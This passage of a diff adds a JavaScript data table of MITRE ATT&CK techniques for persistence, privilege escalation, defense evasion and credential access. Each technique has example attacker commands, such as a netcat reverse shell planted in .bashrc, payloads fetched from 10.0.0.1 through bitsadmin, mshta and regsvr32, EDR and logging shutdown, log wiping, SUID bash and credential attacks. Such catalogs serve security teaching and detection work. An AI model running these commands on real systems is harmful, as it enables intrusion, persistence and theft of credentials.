+    sub:[{id:".001",name:"Change Default File Association"},{id:".002",name:"Screensaver"},{id:".003",name:"Windows Management Instrumentation Event Subscription"},{id:".004",name:"Unix Shell Configuration Modification"},{id:".005",name:"Trap"},{id:".006",name:"LC_LOAD_DYLIB Addition"},{id:".007",name:"Netsh Helper DLL"},{id:".008",name:"Accessibility Features"},{id:".009",name:"AppCert DLLs"},{id:".010",name:"AppInit DLLs"},{id:".011",name:"Application Shimming"},{id:".012",name:"Image File Execution Options Injection"},{id:".013",name:"PowerShell Profile"},{id:".014",name:"Emond"},{id:".015",name:"Component Object Model Hijacking"},{id:".016",name:"Installer Packages"},{id:".017",name:"Udev Rules"}],
+    cmds:[{c:"echo 'nc -e /bin/bash 10.0.0.1 4444 &' >> ~/.bashrc",n:"Bash profile persistence"},{c:"# WMI event subscription via PowerShell",n:"WMI persistence"}]},
+   {id:"T1133",name:"External Remote Services",desc:"Use external remote services as persistence vector.",
+    sub:[],cmds:[{c:"# Keep VPN credentials / maintain RDP access",n:"Remote service persistence"}]},
+   {id:"T1574",name:"Hijack Execution Flow",desc:"Hijack how OS runs executables: DLL, path, search order.",
+    sub:[{id:".001",name:"DLL Search Order Hijacking"},{id:".002",name:"DLL Side-Loading"},{id:".004",name:"Dylib Hijacking"},{id:".005",name:"Executable Installer File Permissions Weakness"},{id:".006",name:"Dynamic Linker Hijacking"},{id:".007",name:"Path Interception by PATH Environment Variable"},{id:".008",name:"Path Interception by Search Order Hijacking"},{id:".009",name:"Path Interception by Unquoted Service Path"},{id:".010",name:"Services File Permissions Weakness"},{id:".011",name:"Services Registry Permissions Weakness"},{id:".012",name:"COR_PROFILER"},{id:".013",name:"KernelCallbackTable"},{id:".014",name:"AppDomainManager"}],
+    cmds:[{c:"echo '/tmp/evil.so' > /etc/ld.so.preload",n:"LD_PRELOAD injection"},{c:"# DLL search order: place evil.dll in app dir",n:"DLL hijacking"}]},
+   {id:"T1525",name:"Implant Internal Image",desc:"Backdoor container images in registry.",
+    sub:[],cmds:[{c:"docker commit webserver attacker/webserver:latest && docker push",n:"Bake backdoor into image"},{c:"# Modify Dockerfile in CI/CD pipeline",n:"Supply chain container attack"}]},
+   {id:"T1556",name:"Modify Authentication Process",desc:"Modify auth process to capture credentials.",
+    sub:[{id:".001",name:"Domain Controller Authentication"},{id:".002",name:"Password Filter DLL"},{id:".003",name:"Pluggable Authentication Modules"},{id:".004",name:"Network Device Authentication"},{id:".005",name:"Reversible Encryption"},{id:".006",name:"Multi-Factor Authentication"},{id:".007",name:"Hybrid Identity"},{id:".008",name:"Network Provider DLL"},{id:".009",name:"Conditional Access Policies"}],
+    cmds:[{c:"# Install malicious PAM module in /lib/security/",n:"PAM backdoor"},{c:"# Skeleton Key: mimikatz misc::skeleton",n:"DC auth bypass"}]},
+   {id:"T1137",name:"Office Application Startup",desc:"Office macros, add-ins, templates for persistence.",
+    sub:[{id:".001",name:"Office Template Macros"},{id:".002",name:"Office Test"},{id:".003",name:"Outlook Forms"},{id:".004",name:"Outlook Home Page"},{id:".005",name:"Outlook Rules"},{id:".006",name:"Add-ins"}],
+    cmds:[{c:"# Normal.dotm: Word startup macro",n:"Word template macro persistence"},{c:"# COM add-in: HKCU\\Software\\Microsoft\\Office\\<ver>\\Excel\\Options",n:"Office COM add-in"}]},
+   {id:"T1653",name:"Power Settings",desc:"Modify power settings to prevent sleep/shutdown.",
+    sub:[],cmds:[{c:"powercfg /change standby-timeout-ac 0",n:"Prevent standby on AC power"},{c:"systemctl mask sleep.target hibernate.target",n:"Disable sleep on Linux"}]},
+   {id:"T1542",name:"Pre-OS Boot",desc:"Modify firmware/bootloader for deep persistence.",
+    sub:[{id:".001",name:"System Firmware"},{id:".002",name:"Component Firmware"},{id:".003",name:"Bootkit"},{id:".004",name:"ROMMONkit"},{id:".005",name:"TFTP Boot"}],
+    cmds:[{c:"# LoJax UEFI rootkit: modify NVRAM",n:"UEFI firmware implant"},{c:"# MBR overwrite: dd if=bootkit.bin of=/dev/sda bs=512 count=1",n:"MBR bootkit"}]},
+   {id:"T1053",name:"Scheduled Task/Job",desc:"Schedule persistent code execution.",
+    sub:[{id:".001",name:"At"},{id:".002",name:"At (Linux)"},{id:".003",name:"Cron"},{id:".004",name:"Launchd"},{id:".005",name:"Scheduled Task"},{id:".006",name:"Systemd Timers"},{id:".007",name:"Container Orchestration Job"}],
+    cmds:[{c:"(crontab -l; echo '@reboot /tmp/.beacon &') | crontab -",n:"Cron reboot persistence"},{c:"schtasks /create /tn SvcUpdate /tr C:\\tmp\\pl.exe /sc onlogon",n:"Windows task on logon"}]},
+   {id:"T1505",name:"Server Software Component",desc:"Backdoor web servers via shell/plugin.",
+    sub:[{id:".001",name:"SQL Stored Procedures"},{id:".002",name:"Transport Agent"},{id:".003",name:"Web Shell"},{id:".004",name:"IIS Components"},{id:".005",name:"Terminal Services DLL"}],
+    cmds:[{c:"cp shell.php /var/www/html/uploads/image.php",n:"Web shell upload"},{c:"# China Chopper: b374k.php one-liner webshell",n:"Mini webshell deployment"}]},
+   {id:"T1205",name:"Traffic Signaling",desc:"Trigger backdoor via specific network packet (port knock).",
+    sub:[{id:".001",name:"Port Knocking"},{id:".002",name:"Socket Filters"}],
+    cmds:[{c:"knock 10.0.0.1 7000 8000 9000 && ssh root@10.0.0.1",n:"Port knocking sequence"},{c:"# BPF filter: activate backdoor on magic packet",n:"Raw socket trigger"}]},
+   {id:"T1078",name:"Valid Accounts",desc:"Use valid accounts for persistent access.",
+    sub:[{id:".001",name:"Default Accounts"},{id:".002",name:"Domain Accounts"},{id:".003",name:"Local Accounts"},{id:".004",name:"Cloud Accounts"}],
+    cmds:[{c:"# Maintain domain admin credentials for re-access",n:"Credential-based persistence"}]},
+  ]},
+
+ {id:"TA0004",name:"Privilege Escalation",color:"#00ffcc",desc:"Gain higher-level permissions.",
+  techs:[
+   {id:"T1548",name:"Abuse Elevation Control Mechanism",desc:"Circumvent elevation controls: UAC, sudo, AuthorizationExecuteWithPrivileges.",
+    sub:[{id:".001",name:"Setuid and Setgid"},{id:".002",name:"Bypass User Account Control"},{id:".003",name:"Sudo and Sudo Caching"},{id:".004",name:"Elevated Execution with Prompt"},{id:".005",name:"Temporary Elevated Cloud Access"},{id:".006",name:"TCC Manipulation"}],
+    cmds:[{c:"sudo -l && sudo /usr/bin/find . -exec /bin/bash \\;",n:"GTFOBins sudo bypass"},{c:"# UAC bypass: fodhelper.exe registry hijack",n:"Windows UAC bypass"},{c:"find / -perm -4000 -type f 2>/dev/null",n:"Find SUID binaries"}]},
+   {id:"T1134",name:"Access Token Manipulation",desc:"Modify/impersonate tokens for elevated context.",
+    sub:[{id:".001",name:"Token Impersonation/Theft"},{id:".002",name:"Create Process with Token"},{id:".003",name:"Make and Impersonate Token"},{id:".004",name:"Parent PID Spoofing"},{id:".005",name:"SID-History Injection"}],
+    cmds:[{c:"meterpreter> getsystem  # all token impersonation methods",n:"Meterpreter privilege escalation"},{c:"mimikatz# token::elevate /domainadmin",n:"Token elevation to domain admin"}]},
+   {id:"T1547",name:"Boot/Logon Autostart Execution",desc:"Autostart execution for privilege escalation.",
+    sub:[{id:".001",name:"Registry Run Keys"},{id:".004",name:"Winlogon Helper DLL"},{id:".005",name:"Security Support Provider"},{id:".006",name:"Kernel Modules"},{id:".008",name:"LSASS Driver"},{id:".009",name:"Shortcut Modification"}],
+    cmds:[{c:"# LKM rootkit: insmod evil.ko",n:"Kernel module for root"}]},
+   {id:"T1037",name:"Boot/Logon Initialization Scripts",desc:"Escalate via scripts running as root.",
+    sub:[{id:".004",name:"RC Scripts"},{id:".005",name:"Startup Items"}],
+    cmds:[{c:"echo 'chmod 4755 /bin/bash' >> /etc/rc.local",n:"Set SUID bash on reboot"}]},
+   {id:"T1543",name:"Create or Modify System Process",desc:"Create privileged service for escalation.",
+    sub:[{id:".002",name:"Systemd Service"},{id:".003",name:"Windows Service"}],
+    cmds:[{c:"sc create evilsvc binpath='C:\\tmp\\pl.exe' && sc start evilsvc",n:"Service runs as SYSTEM"}]},
+   {id:"T1484",name:"Domain or Tenant Policy Modification",desc:"Modify domain/tenant policy to escalate.",
+    sub:[{id:".001",name:"Group Policy Modification"},{id:".002",name:"Trust Modification"}],
+    cmds:[{c:"# Modify GPO to add attacker to Domain Admins",n:"GPO abuse for escalation"},{c:"Set-ADForest -Identity corp.local -SPNSuffixes @{Add='evil.com'}",n:"AD trust modification"}]},
+   {id:"T1611",name:"Escape to Host",desc:"Escape container to host OS.",
+    sub:[],cmds:[{c:"docker run --rm -v /:/host alpine chroot /host /bin/bash",n:"Privileged container escape"},{c:"# CVE-2022-0492: cgroups v1 container escape",n:"cgroups escape"}]},
+   {id:"T1546",name:"Event Triggered Execution",desc:"Events trigger code with elevated privileges.",
+    sub:[{id:".003",name:"WMI Event Subscription"},{id:".008",name:"Accessibility Features"},{id:".011",name:"Application Shimming"},{id:".012",name:"IFEO Injection"}],
+    cmds:[{c:"# sethc.exe → cmd.exe sticky keys backdoor",n:"Accessibility feature escalation"}]},
+   {id:"T1068",name:"Exploitation for Privilege Escalation",desc:"Exploit kernel/driver/service vulnerability for root.",
+    sub:[],cmds:[{c:"linux-exploit-suggester.sh | grep -E 'CVE|highly probable'",n:"Local exploit suggestions"},{c:"./cve-2022-0847  # Dirty Pipe",n:"CVE-2022-0847 root exploit"},{c:"./pwnkit  # CVE-2021-4034 polkit",n:"PwnKit universal Linux priv-esc"}]},
+   {id:"T1574",name:"Hijack Execution Flow",desc:"Hijack DLL/binary load order for escalation.",
+    sub:[{id:".001",name:"DLL Search Order Hijacking"},{id:".002",name:"DLL Side-Loading"},{id:".006",name:"Dynamic Linker Hijacking"},{id:".007",name:"PATH Interception"},{id:".009",name:"Unquoted Service Path"}],
+    cmds:[{c:"echo '/tmp/evil.so' > /etc/ld.so.preload",n:"LD_PRELOAD root injection"},{c:"# Unquoted path: C:\\Program Files\\My App.exe → C:\\Program.exe",n:"Unquoted service path"}]},
+   {id:"T1055",name:"Process Injection",desc:"Inject code into privileged process.",
+    sub:[{id:".001",name:"Dynamic-link Library Injection"},{id:".002",name:"Portable Executable Injection"},{id:".003",name:"Thread Execution Hijacking"},{id:".004",name:"Asynchronous Procedure Call"},{id:".005",name:"Thread Local Storage"},{id:".008",name:"Ptrace System Calls"},{id:".009",name:"Proc Memory"},{id:".011",name:"Extra Window Memory Injection"},{id:".012",name:"Process Hollowing"},{id:".013",name:"Process Doppelgänging"},{id:".014",name:"VDSO Hijacking"},{id:".015",name:"ListPlanting"}],
+    cmds:[{c:"meterpreter> migrate <winlogon PID>",n:"Migrate to SYSTEM process"},{c:"# ptrace: attach to root process and inject shellcode",n:"Linux ptrace injection"}]},
+   {id:"T1053",name:"Scheduled Task/Job",desc:"Scheduled task running as SYSTEM/root.",
+    sub:[{id:".003",name:"Cron"},{id:".005",name:"Scheduled Task"}],
+    cmds:[{c:"echo '* * * * * root /bin/bash -c \"chmod +s /bin/bash\"' >> /etc/cron.d/upd",n:"Root cron for SUID"}]},
+   {id:"T1078",name:"Valid Accounts",desc:"Use higher-privileged valid accounts.",
+    sub:[{id:".002",name:"Domain Accounts"},{id:".003",name:"Local Accounts"}],
+    cmds:[{c:"# Use found domain admin credentials",n:"Domain admin account use"}]},
+  ]},
+
+ {id:"TA0005",name:"Defense Evasion",color:"#00b4d8",desc:"Avoid being detected.",
+  techs:[
+   {id:"T1548",name:"Abuse Elevation Control Mechanism",desc:"Bypass UAC/sudo to avoid detection.",
+    sub:[{id:".002",name:"Bypass UAC"},{id:".003",name:"Sudo Caching"}],
+    cmds:[{c:"# fodhelper UAC bypass: reg add HKCU\\...",n:"Silent UAC bypass"}]},
+   {id:"T1134",name:"Access Token Manipulation",desc:"Use legitimate tokens to blend in.",
+    sub:[{id:".001",name:"Token Impersonation"},{id:".002",name:"Create Process with Token"},{id:".004",name:"Parent PID Spoofing"}],
+    cmds:[{c:"# PPID spoofing: appear as child of explorer.exe",n:"Process tree camouflage"}]},
+   {id:"T1197",name:"BITS Jobs",desc:"Use BITS for stealthy download/execution.",
+    sub:[],cmds:[{c:"bitsadmin /transfer myJob http://10.0.0.1/pl.exe C:\\tmp\\pl.exe",n:"BITS stealthy download"}]},
+   {id:"T1612",name:"Build Image on Host",desc:"Build container locally to bypass image scanning.",
+    sub:[],cmds:[{c:"docker build -t evil . --no-cache",n:"Build malicious image locally"}]},
+   {id:"T1622",name:"Debugger Evasion",desc:"Detect and evade debugging environments.",
+    sub:[],cmds:[{c:"IsDebuggerPresent() → exit if true",n:"Anti-debug check in payload"},{c:"# RDTSC timing check: detect VM/debug slowdown",n:"Timing-based anti-debug"}]},
+   {id:"T1140",name:"Deobfuscate/Decode Files or Information",desc:"Decode encoded payloads at runtime.",
+    sub:[],cmds:[{c:"echo 'cGF5bG9hZA==' | base64 -d | bash",n:"Base64 decode and execute"},{c:"certutil -decode encoded.b64 payload.exe",n:"CertUtil decode (LOLBin)"}]},
+   {id:"T1006",name:"Direct Volume Access",desc:"Access raw disk volume to bypass file system controls.",
+    sub:[],cmds:[{c:"# Read raw NTFS: bypass file ACLs",n:"Raw disk access"}]},
+   {id:"T1480",name:"Execution Guardrails",desc:"Constrain payload to execute only in specific conditions.",
+    sub:[{id:".001",name:"Environmental Keying"},{id:".002",name:"Mutual Exclusion"}],
+    cmds:[{c:"# Only decrypt payload if specific registry key exists",n:"Environmental keying"},{c:"# Mutex check: exit if C2 already running",n:"Mutex-based singleton"}]},
+   {id:"T1211",name:"Exploitation for Defense Evasion",desc:"Exploit vulnerability to disable/bypass defenses.",
+    sub:[],cmds:[{c:"# Exploit PPL bypass to terminate EDR: CVE-2022-21882",n:"EDR kill via kernel exploit"}]},
+   {id:"T1222",name:"File and Directory Permissions Modification",desc:"Modify file permissions to allow execution or deny access.",
+    sub:[{id:".001",name:"Windows File and Directory Permissions Modification"},{id:".002",name:"Linux and Mac File and Directory Permissions Modification"}],
+    cmds:[{c:"chmod 777 /etc/shadow && chown hacker:hacker /etc/shadow",n:"Permission modification"},{c:"icacls C:\\Windows\\System32\\cmd.exe /grant Everyone:F",n:"Windows ACL modification"}]},
+   {id:"T1564",name:"Hide Artifacts",desc:"Hide files, processes, indicators of compromise.",
+    sub:[{id:".001",name:"Hidden Files and Directories"},{id:".002",name:"Hidden Users"},{id:".003",name:"Hidden Window"},{id:".004",name:"NTFS File Attributes"},{id:".005",name:"Hidden File System"},{id:".006",name:"Run Virtual Instance"},{id:".007",name:"VBA Stomping"},{id:".008",name:"Email Hiding Rules"},{id:".009",name:"Resource Forking"},{id:".010",name:"Process Argument Spoofing"},{id:".011",name:"Ignore Process Interrupts"},{id:".012",name:"File/Path Exclusions"}],
+    cmds:[{c:"mv implant /tmp/.systemd-private-xxx",n:"Hidden file (dot prefix)"},{c:"# NTFS ADS: echo payload > legit.txt:evil.exe",n:"NTFS alternate data stream"}]},
+   {id:"T1574",name:"Hijack Execution Flow",desc:"DLL/dylib hijacking to blend with legit processes.",
+    sub:[{id:".001",name:"DLL Search Order Hijacking"},{id:".002",name:"DLL Side-Loading"},{id:".012",name:"COR_PROFILER"}],
+    cmds:[{c:"# Place evil.dll in app directory before legit DLL path",n:"DLL search order hijack"}]},
+   {id:"T1562",name:"Impair Defenses",desc:"Disable or impair security tools and logging.",
+    sub:[{id:".001",name:"Disable or Modify Tools"},{id:".002",name:"Disable Windows Event Logging"},{id:".003",name:"Impair Command History Logging"},{id:".004",name:"Disable or Modify System Firewall"},{id:".006",name:"Indicator Blocking"},{id:".007",name:"Disable or Modify Cloud Firewall"},{id:".008",name:"Disable or Modify Cloud Logs"},{id:".009",name:"Safe Mode Boot"},{id:".010",name:"Downgrade Attack"},{id:".011",name:"Spoof Security Alerting"},{id:".012",name:"Disable or Modify Linux Audit System"}],
+    cmds:[{c:"systemctl stop crowdstrike-falcon && systemctl disable crowdstrike-falcon",n:"Kill EDR sensor"},{c:"auditctl -e 0  # disable auditd",n:"Disable Linux audit"},{c:"Set-MpPreference -DisableRealtimeMonitoring $true",n:"Disable Windows Defender RT"}]},
+   {id:"T1070",name:"Indicator Removal",desc:"Remove artifacts: logs, files, timestamps.",
+    sub:[{id:".001",name:"Clear Windows Event Logs"},{id:".002",name:"Clear Linux or Mac System Logs"},{id:".003",name:"Clear Command History"},{id:".004",name:"File Deletion"},{id:".005",name:"Network Share Connection Removal"},{id:".006",name:"Timestomp"},{id:".007",name:"Clear Network Connection History and Configurations"},{id:".008",name:"Clear Mailbox Data"},{id:".009",name:"Clear Persistence"}],
+    cmds:[{c:"history -c && cat /dev/null > ~/.bash_history && ln -sf /dev/null ~/.bash_history",n:"Wipe bash history"},{c:"wevtutil cl Security && wevtutil cl System && wevtutil cl Application",n:"Clear Windows event logs"},{c:"touch -t 202001010000 /tmp/evil.sh",n:"Timestomp: fake modification time"}]},
+   {id:"T1202",name:"Indirect Command Execution",desc:"Execute via legitimate OS utilities (LOLBins).",
+    sub:[],cmds:[{c:"forfiles /p C:\\ /m *.exe /c 'cmd /c payload.exe'",n:"Forfiles LOLBin"},{c:"pcalua.exe -a payload.exe",n:"Program Compatibility Assistant LOLBin"}]},
+   {id:"T1036",name:"Masquerading",desc:"Disguise malicious files/processes as legitimate.",
+    sub:[{id:".001",name:"Invalid Code Signature"},{id:".002",name:"Right-to-Left Override"},{id:".003",name:"Rename System Utilities"},{id:".004",name:"Masquerade Task or Service"},{id:".005",name:"Match Legitimate Name or Location"},{id:".006",name:"Space after Filename"},{id:".007",name:"Double File Extension"},{id:".008",name:"Masquerade File Type"},{id:".009",name:"Break Process Trees"},{id:".010",name:"Spoof File Metadata"}],
+    cmds:[{c:"cp /bin/bash /tmp/systemd-udevd && /tmp/systemd-udevd -p",n:"Rename to legit process name"},{c:"mv evil.exe 'update.exe '  # trailing space",n:"Filename with trailing space"}]},
+   {id:"T1556",name:"Modify Authentication Process",desc:"Change auth to bypass defenses.",
+    sub:[{id:".006",name:"Multi-Factor Authentication"},{id:".009",name:"Conditional Access Policies"}],
+    cmds:[{c:"# Disable Conditional Access policy via Azure AD",n:"CAP disable for evasion"}]},
+   {id:"T1578",name:"Modify Cloud Compute Infrastructure",desc:"Modify cloud infra to evade detection.",
+    sub:[{id:".001",name:"Create Snapshot"},{id:".002",name:"Create Cloud Instance"},{id:".003",name:"Delete Cloud Instance"},{id:".004",name:"Revert Cloud Instance"},{id:".005",name:"Modify Cloud Compute Configurations"}],
+    cmds:[{c:"aws ec2 create-snapshot --volume-id vol-xxx",n:"Snapshot before destructive action"},{c:"aws ec2 terminate-instances --instance-ids i-xxx",n:"Delete instance to remove evidence"}]},
+   {id:"T1112",name:"Modify Registry",desc:"Modify Windows Registry to hide configuration.",
+    sub:[],cmds:[{c:"reg add HKLM\\System\\CurrentControlSet\\Services\\evil /v Type /t REG_DWORD /d 0x10",n:"Registry modification"}]},
+   {id:"T1601",name:"Modify System Image",desc:"Modify network device OS image.",
+    sub:[{id:".001",name:"Patch System Image"},{id:".002",name:"Downgrade System Image"}],
+    cmds:[{c:"# Cisco IOS patch: inject backdoor into IOS image",n:"Network device firmware mod"}]},
+   {id:"T1599",name:"Network Boundary Bridging",desc:"Bridge network segments to bypass segmentation.",
+    sub:[{id:".001",name:"Network Address Translation Traversal"}],
+    cmds:[{c:"# NAT traversal: hole punch via STUN/TURN",n:"NAT traversal for evasion"}]},
+   {id:"T1027",name:"Obfuscated Files or Information",desc:"Encode/encrypt/compress to bypass signature detection.",
+    sub:[{id:".001",name:"Binary Padding"},{id:".002",name:"Software Packing"},{id:".003",name:"Steganography"},{id:".004",name:"Compile After Delivery"},{id:".005",name:"Indicator Removal from Tools"},{id:".006",name:"HTML Smuggling"},{id:".007",name:"Dynamic API Resolution"},{id:".008",name:"Stripped Payloads"},{id:".009",name:"Embedded Payloads"},{id:".010",name:"Command Obfuscation"},{id:".011",name:"Fileless Storage"},{id:".012",name:"LNK Icon Smuggling"},{id:".013",name:"Encrypted/Encoded File"},{id:".014",name:"Polymorphic Code"}],
+    cmds:[{c:"cat payload.sh | base64 -w0 | xargs -I{} echo 'echo {}|base64 -d|bash'",n:"Base64 obfuscation"},{c:"# HTML smuggling: encode payload in JS/HTML blob",n:"HTML smuggling delivery"}]},
+   {id:"T1542",name:"Pre-OS Boot",desc:"Bootkit/firmware for deep evasion.",
+    sub:[{id:".001",name:"System Firmware"},{id:".003",name:"Bootkit"}],
+    cmds:[{c:"# LoJax UEFI implant: survives OS reinstall",n:"UEFI-level persistence+evasion"}]},
+   {id:"T1055",name:"Process Injection",desc:"Inject into legitimate processes to evade process-based detection.",
+    sub:[{id:".001",name:"DLL Injection"},{id:".002",name:"PE Injection"},{id:".003",name:"Thread Hijacking"},{id:".004",name:"APC Injection"},{id:".012",name:"Process Hollowing"},{id:".013",name:"Process Doppelgänging"}],
+    cmds:[{c:"# Process hollowing: spawn svchost, hollow, inject",n:"Classic process hollowing"},{c:"# Reflective DLL injection: load DLL from memory",n:"In-memory DLL injection"}]},
+   {id:"T1207",name:"Rogue Domain Controller",desc:"Register rogue DC to intercept replication.",
+    sub:[],cmds:[{c:"mimikatz# lsadump::dcsync /domain:corp.local /all",n:"DCSync to replicate hashes"}]},
+   {id:"T1014",name:"Rootkit",desc:"Use rootkits to hide presence.",
+    sub:[],cmds:[{c:"insmod diamorphine.ko  # hide PID/files",n:"Diamorphine Linux LKM rootkit"},{c:"# eBPF-based rootkit: hook kernel functions",n:"eBPF rootkit"}]},
+   {id:"T1218",name:"System Binary Proxy Execution",desc:"Execute via signed/trusted binaries (LOLBins).",
+    sub:[{id:".001",name:"Compiled HTML File"},{id:".002",name:"Control Panel"},{id:".003",name:"CMSTP"},{id:".004",name:"InstallUtil"},{id:".005",name:"Mshta"},{id:".007",name:"Msiexec"},{id:".008",name:"Odbcconf"},{id:".009",name:"Regsvcs/Regasm"},{id:".010",name:"Regsvr32"},{id:".011",name:"Rundll32"},{id:".012",name:"Verclsid"},{id:".013",name:"Mavinject"},{id:".014",name:"MMC"},{id:".015",name:"Wscript/Cscript"}],
+    cmds:[{c:"rundll32.exe javascript:\"..\\..\\mshtml,RunHTMLApplication\";...",n:"Rundll32 LOLBin"},{c:"mshta.exe http://10.0.0.1/evil.hta",n:"Mshta HTML Application"},{c:"regsvr32 /s /n /u /i:http://10.0.0.1/evil.sct scrobj.dll",n:"Regsvr32 squiblydoo"}]},
+   {id:"T1216",name:"System Script Proxy Execution",desc:"Execute via trusted system scripts.",
+    sub:[{id:".001",name:"PubPrn"},{id:".002",name:"SyncAppvPublishingServer"}],
+    cmds:[{c:"PubPrn.vbs 127.0.0.1 script:http://10.0.0.1/evil.sct",n:"PubPrn LOLBin"}]},
+   {id:"T1553",name:"Subvert Trust Controls",desc:"Bypass code signing, trust controls.",
+    sub:[{id:".001",name:"Gatekeeper Bypass"},{id:".002",name:"Code Signing"},{id:".003",name:"SIP and Trust Provider Hijacking"},{id:".004",name:"Install Root Certificate"},{id:".005",name:"Mark-of-the-Web Bypass"},{id:".006",name:"Code Signing Policy Modification"}],
+    cmds:[{c:"# Remove MOTW via ISO/VHD container",n:"Mark-of-the-Web bypass"},{c:"certutil -addstore -enterprise Root malicious-ca.crt",n:"Install rogue root CA"}]},
+   {id:"T1205",name:"Traffic Signaling",desc:"Use specific traffic patterns to activate backdoor.",
+    sub:[{id:".001",name:"Port Knocking"},{id:".002",name:"Socket Filters"}],
+    cmds:[{c:"knock 10.0.0.1 7000 8000 9000",n:"Port knock sequence"}]},
+   {id:"T1127",name:"Trusted Developer Utilities Proxy Execution",desc:"Abuse dev tools (MSBuild, msbuild.exe) for execution.",
+    sub:[{id:".001",name:"MSBuild"}],
+    cmds:[{c:"MSBuild.exe malicious.csproj  # inline task execution",n:"MSBuild LOLBin"}]},
+   {id:"T1535",name:"Unused/Unsupported Cloud Regions",desc:"Use obscure cloud regions to evade monitoring.",
+    sub:[],cmds:[{c:"aws ec2 describe-regions | jq '.Regions[].RegionName'  # then use ap-southeast-3",n:"Use rarely-monitored region"}]},
+   {id:"T1550",name:"Use Alternate Authentication Material",desc:"Use hash/ticket/token instead of password.",
+    sub:[{id:".001",name:"Application Access Token"},{id:".002",name:"Pass the Hash"},{id:".003",name:"Pass the Ticket"},{id:".004",name:"Web Session Cookie"}],
+    cmds:[{c:"impacket-psexec -hashes :NTLMhash admin@10.0.0.5",n:"Pass-the-Hash"},{c:"mimikatz# kerberos::ptt ticket.kirbi",n:"Pass-the-Ticket (Kerberos)"}]},
+   {id:"T1078",name:"Valid Accounts",desc:"Use valid accounts to avoid anomaly detection.",
+    sub:[{id:".001",name:"Default Accounts"},{id:".002",name:"Domain Accounts"},{id:".003",name:"Local Accounts"},{id:".004",name:"Cloud Accounts"}],
+    cmds:[{c:"# Blend with normal admin activity patterns",n:"Living off valid credentials"}]},
+   {id:"T1497",name:"Virtualization/Sandbox Evasion",desc:"Detect and evade analysis sandboxes.",
+    sub:[{id:".001",name:"System Checks"},{id:".002",name:"User Activity Based Checks"},{id:".003",name:"Time Based Evasion"}],
+    cmds:[{c:"# Check CPUID, MAC OUI, registry for VM indicators",n:"VM/sandbox detection"},{c:"sleep 600 || WaitForSingleObject(mutex, 600000)",n:"Time-based sandbox evasion"}]},
+   {id:"T1600",name:"Weaken Encryption",desc:"Weaken encryption on network devices.",
+    sub:[{id:".001",name:"Reduce Key Space"},{id:".002",name:"Disable Crypto Hardware"}],
+    cmds:[{c:"# Force SSLv3/RC4 on network device config",n:"Downgrade encryption"}]},
+  ]},
+
+ {id:"TA0006",name:"Credential Access",color:"#c77dff",desc:"Steal account credentials.",
+  techs:[
+   {id:"T1557",name:"Adversary-in-the-Middle",desc:"Position between devices to intercept credentials.",
+    sub:[{id:".001",name:"LLMNR/NBT-NS Poisoning and SMB Relay"},{id:".002",name:"ARP Cache Poisoning"},{id:".003",name:"DHCP Spoofing"},{id:".004",name:"Evil Twin"}],
+    cmds:[{c:"responder -I eth0 -wrf",n:"LLMNR/NBT-NS poisoning → capture NTLMv2"},{c:"# ntlmrelayx: relay captured hashes to targets",n:"SMB relay attack"},{c:"arpspoof -i eth0 -t 192.168.1.1 192.168.1.100",n:"ARP cache poisoning"}]},
+   {id:"T1110",name:"Brute Force",desc:"Guess passwords via brute force or spray.",
+    sub:[{id:".001",name:"Password Guessing"},{id:".002",name:"Password Cracking"},{id:".003",name:"Password Spraying"},{id:".004",name:"Credential Stuffing"}],
+    cmds:[{c:"hydra -L users.txt -P rockyou.txt ssh://target -t 4 -W 3",n:"SSH brute force"},{c:"hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r best64.rule",n:"NTLM hash cracking"},{c:"kerbrute passwordspray -d corp.local users.txt 'Spring2024!'",n:"Kerberos spray"}]},
+   {id:"T1555",name:"Credentials from Password Stores",desc:"Extract from password managers, browsers, vaults.",
+    sub:[{id:".001",name:"Keychain"},{id:".002",name:"Securityd Memory"},{id:".003",name:"Credentials from Web Browsers"},{id:".004",name:"Windows Credential Manager"},{id:".005",name:"Password Managers"},{id:".006",name:"Cloud Secrets Management Stores"}],
+    cmds:[{c:"# SharpChrome: extract Chrome saved passwords",n:"Browser credential extraction"},{c:"cmdkey /list  # list Windows Credential Manager",n:"List cached Windows credentials"}]},
+   {id:"T1212",name:"Exploitation for Credential Access",desc:"Exploit vulnerability to steal credentials.",
+    sub:[],cmds:[{c:"# CVE-2020-1472 ZeroLogon: reset DC machine account password",n:"ZeroLogon Netlogon exploit"},{c:"# Kerberoast via CVE in Kerberos implementation",n:"Kerberos implementation exploit"}]},
+   {id:"T1187",name:"Forced Authentication",desc:"Force victim to authenticate to attacker-controlled server.",
+    sub:[],cmds:[{c:"# Responder + fake share → forced SMB auth",n:"UNC path injection in email"},{c:"# SCF file in share: \\\\attacker\\share\\evil.scf",n:"SCF file forced auth"}]},
+   {id:"T1606",name:"Forge Web Credentials",desc:"Forge web authentication tokens/cookies.",
+    sub:[{id:".001",name:"Web Cookies"},{id:".002",name:"SAML Tokens"}],
+    cmds:[{c:"# Golden SAML: forge SAML assertion with stolen ADFS key",n:"Golden SAML attack"},{c:"# Forge JWT with weak secret or none algorithm",n:"JWT forgery"}]},
+   {id:"T1056",name:"Input Capture",desc:"Keylog, credential prompt interception.",
+    sub:[{id:".001",name:"Keylogging"},{id:".002",name:"GUI Input Capture"},{id:".003",name:"Web Portal Capture"},{id:".004",name:"Credential API Hooking"}],
+    cmds:[{c:"meterpreter> keyscan_start && keyscan_dump",n:"Meterpreter keylogger"},{c:"# SetWindowsHookEx WH_KEYBOARD_LL hook",n:"Win32 keyboard hook"}]},
+   {id:"T1557",name:"Man-in-the-Middle",desc:"Intercept network credentials.",
+    sub:[{id:".001",name:"LLMNR Poisoning"},{id:".002",name:"ARP Poisoning"}],
+    cmds:[{c:"responder -I eth0 -A  # analyze mode first",n:"Passive credential capture"}]},
+   {id:"T1556",name:"Modify Authentication Process",desc:"Backdoor auth to steal credentials.",
+    sub:[{id:".001",name:"Domain Controller Authentication"},{id:".002",name:"Password Filter DLL"},{id:".003",name:"Pluggable Authentication Modules"}],
+    cmds:[{c:"# Install pam_unix2 backdoored version",n:"Malicious PAM module logs all passwords"}]},
+   {id:"T1040",name:"Network Sniffing",desc:"Capture network traffic for credentials.",
+    sub:[],cmds:[{c:"tcpdump -i eth0 -w capture.pcap 'port 21 or port 23 or port 110'",n:"Capture cleartext protocol creds"},{c:"wireshark -i eth0 -k -f 'host 10.0.0.1'",n:"Targeted host capture"}]},
+   {id:"T1003",name:"OS Credential Dumping",desc:"Dump credentials from OS memory/files.",
